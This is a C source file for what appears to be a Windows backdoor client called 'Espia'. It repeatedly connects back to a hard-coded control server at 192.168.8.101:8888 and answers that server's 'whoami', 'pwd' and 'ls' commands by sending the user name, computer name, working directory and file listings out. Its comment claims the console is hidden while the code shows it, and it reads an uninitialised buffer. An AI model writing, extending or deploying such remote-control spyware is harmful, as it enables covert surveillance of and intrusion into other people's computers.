#include "Espia/includes/espia.h"

#ifndef WINDOWS_H
#define WINDOWS_H
#include <windows.h> 
#endif

#if DEBUG
#include <stdio.h>
#endif

#define TRY_SERVER 5
#define BUFF_SIZE 1024

int main() {
    /* Allocate a new console and hide it (SW_HIDE) */
	HWND stealth;           
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, SW_NORMAL);
    /* ------------------------------------------- */


    /* Keep trying to connect to the server */
	WORD server_status;
	SOCKET connection;
	while ((server_status = espia_connect("192.168.8.101", "8888", &connection)) == CONNECTION_FAIL)
		Sleep(TRY_SERVER);
    /* ------------------------------------ */


    /* Main flow of the program, command recieving, parsing */
    CHAR recv_buff[BUFF_SIZE];
    int cmd_size = -1;
    while (strcmp(recv_buff, "exit") && cmd_size != 0) {
        memset(recv_buff, 0, BUFF_SIZE);
        cmd_size = espia_recv(&connection, recv_buff, BUFF_SIZE);
        memset(recv_buff + cmd_size - 1, 0, 1);

        if (strcmp(recv_buff, "whoami") == 0) {
            WCHAR whoami_buff[256 + MAX_COMPUTERNAME_LENGTH + 2];
            memset(whoami_buff, 0, sizeof(whoami_buff));
            whoami(whoami_buff, sizeof(whoami_buff));
            espia_send(&connection, whoami_buff, sizeof(whoami_buff));
        } else if (strcmp(recv_buff, "pwd") == 0) {
            WCHAR pwd_buff[MAX_PATH + 1];
            memset(pwd_buff, 0, sizeof(pwd_buff));
            pwd(pwd_buff, sizeof(pwd_buff));
            espia_send(&connection, pwd_buff, sizeof(pwd_buff));
        } else if (strcmp(recv_buff, "ls") == 0) {
            ls(&connection);
        } else {
            printf("%s\n", recv_buff);
        }
    }
    /* ---------------------------------------------------- */


    /* Disconnecting from the server */
	espia_disconnect(&connection);
    /* ----------------------------- */

	return 0;
}